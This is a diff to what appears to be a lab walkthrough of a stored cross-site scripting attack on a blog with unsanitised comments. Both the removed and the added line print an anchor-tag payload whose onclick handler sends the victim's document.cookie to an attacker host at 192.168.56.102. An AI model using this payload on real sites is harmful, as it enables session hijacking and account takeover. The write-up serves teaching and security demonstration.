@@ -51,7 +51,8 @@ Demo's URL: [Demo]()
 ### Step 1: Attacker
 
 To initiate the attack, I accessed the blog application, which allows users to post comments without any form of input validation or sanitization. Recognizing this vulnerability, I crafted a cross-site scripting (XSS) payload intended to capture the session cookie of a logged-in user. The injected payload looked like this:
-<a onclick=window.location='http://192.168.56.102/?cookie=+document.cookie>click here</a> 
+
+<a onclick=window.location=http://192.168.56.102/?cookie=+document.cookie>click here</a> 
 
 ![level 0](../images/h31.jpeg)
 
